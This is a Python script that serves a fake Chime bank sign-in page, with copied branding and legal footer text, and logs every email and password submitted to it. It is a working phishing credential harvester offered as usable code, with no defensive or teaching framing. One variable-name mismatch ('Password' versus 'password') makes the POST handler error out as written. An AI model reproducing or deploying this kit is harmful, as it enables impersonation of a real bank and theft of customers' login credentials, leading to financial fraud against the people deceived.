from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs

HTML = """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ChimeBank</title>

<style>
body{
    margin:0;
    font-family: Arial, sans-serif;
    background:#ffffff;
}

.page{
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
}

.card{
    width:90%;
    max-width:420px;
}

.brand{
    font-size:40px;
    font-weight:900;
    color:#1DB954;
    margin-bottom:10px;
}

label{
    display:block;
    margin-top:12px;
    font-weight:700;
    font-size:14px;
}

input{
    width:100%;
    padding:16px;
    margin-top:6px;
    border:1px solid #ddd;
    border-radius:12px;
    font-size:16px;
    box-sizing:border-box;
}

.pass-wrap{
    position:relative;
}

.eye{
    position:absolute;
    right:12px;
    top:50%;
    transform:translateY(-50%);
    cursor:pointer;
    color:#777;
}

button{
    width:100%;
    padding:16px;
    margin-top:16px;
    border:none;
    border-radius:12px;
    background:#eee;
    font-size:18px;
    font-weight:800;
}

button:hover{
    background:#1DB954;
    color:white;
}

.info{
    margin-top:12px;
    font-size:12px;
    color:#333;
}
</style>

</head>

<body>

<div class="page">
<div class="card">

<div class="brand">Chime<span></span></div>

<form method="POST">

<label>Email</label>

<input type="text" name="email" placeholder="Enter email" required>
<label>Password</label>																																																																						<div class="pass-wrap">

<input type="text" id="password" name="password" placeholder="Enter password" required>
<span class="eye" onclick="togglePass()"></span>
</div>

<button type="submit">Sign in</button>

</form>

<div class="info">
By signing in, you agree to Chime security verification system.
</div>
<div class="link">

<a href="#">forget email?</a><br>


<a href="#">forget password?</a><br>


Need account? <a href="#">sign up </a>

</div>
<div class="footer">

© 2026 chime.chime.all Rights Reserved. 


Banking Services provided by The Bancorp Bank, N.A., or Stride Bank, N.A., Members FDIC. The Chime Visa® Debit Card is issued by The Bancorp Bank, N.A., or Stride Bank pursuant to a license from Visa U.S.A. Inc. and may be used everywhere Visa debit cards are accepted. Please see back of your Card for its issuing bank.
</div>

</div>

</div>

<script>
function togglePass(){
    const p = document.getElementById("password");

    if(p.type === "password"){
        p.type = "text";
    } else {
        p.type = "password";
    }
}
</script>

</body>
</html>
"""

class Handler(BaseHTTPRequestHandler):

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(HTML.encode())

    def do_POST(self):
        length = int(self.headers["Content-Length"])
        body = self.rfile.read(length).decode()
        data = parse_qs(body)

        print(data)

        email = data.get("email", [""])[0]
        Password = data.get("password", [""])[0]

        print("\n=== CHIME LOGIN ATTEMPT===")
        print("EMAIL:", email)
        print("Password:", password)

        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(b"password received")

import os

port = int(os.environ.get("PORT", 8080))
HTTPServer(("0.0.0.0", port), Handler).serve_forever()
